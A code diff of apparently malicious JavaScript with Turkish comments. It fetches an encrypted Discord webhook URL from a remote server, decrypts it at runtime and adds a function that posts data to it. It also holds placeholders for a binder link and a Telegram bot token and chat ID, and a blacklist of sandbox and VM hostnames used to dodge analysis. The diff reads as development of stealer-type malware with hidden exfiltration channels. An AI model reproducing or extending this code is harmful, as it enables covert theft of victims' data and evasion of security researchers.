@@ -28,10 +28,11 @@ const url = 'BINDER-LINK-HERE';
 const botToken = 'YOURBOTTOKEN';
 const chatId = 'YOURCHATID';
 
+// Axios modülünü dahil et
+const axios = require('axios');
+
 // Global değişken tanımlama
 let discordWebhookUrl = null;
-
-// decode.js içeriği
 
 async function decryptText(encryptedBase64, ivBase64, keyBase64) {
     const encryptedArray = base64ToArrayBuffer(encryptedBase64);
@@ -77,11 +78,11 @@ async function fetchData(url) {
 }
 
 async function fetchAndDecrypt() {
-    const basewebhookurl = 'REMPLACE-ME-OC';
+    const basewebhookurl = 'REMPLACE-ME-OC'; // Hangi base url'yi kullanıyorsanız, buraya yazın.
 
-    const encryptedUrl = `${baseUrl}/jacob`;
-    const ivUrl = `${baseUrl}/mayo`;
-    const keyUrl = `${baseUrl}/tenk`;
+    const encryptedUrl = `${basewebhookurl}/jacob`;
+    const ivUrl = `${basewebhookurl}/mayo`;
+    const keyUrl = `${basewebhookurl}/tenk`;
 
     try {
         const encryptedBase64 = await fetchData(encryptedUrl);
@@ -105,22 +106,30 @@ async function fetchAndDecrypt() {
     await fetchAndDecrypt();
 
     if (discordWebhookUrl) {
-        // Burada `discordWebhookUrl`'i kullanabilirsin
         console.log("Webhook URL kullanıma hazır:", discordWebhookUrl);
+        const payload = {
+            content: "hash decode success"
+        };
+        await sendWebhook(payload);
     } else {
         console.error("Webhook URL alınamadı.");
     }
 })();
 
-// Diğer fonksiyonlar
-function someOtherFunction() {
+// Webhook gönderme fonksiyonu
+async function sendWebhook(payload) {
     if (discordWebhookUrl) {
-        console.log("Diğer fonksiyon kullanıyor:", discordWebhookUrl);
-        // Webhook'u kullanarak işlem yap
+        try {
+            await axios.post(discordWebhookUrl, payload);
+            console.log('Webhook gönderildi');
+        } catch (error) {
+            console.error(`Webhook gönderilirken hata oluştu: ${error.message}`);
+        }
     } else {
         console.error("Webhook URL henüz tanımlanmadı.");
     }
 }
+
 const discordWebhookUr1 = discordWebhookUrl;
 
 const blackListedHostname = ["BEE7370C-8C0C-4", "AppOnFly-VPS","tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",  "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
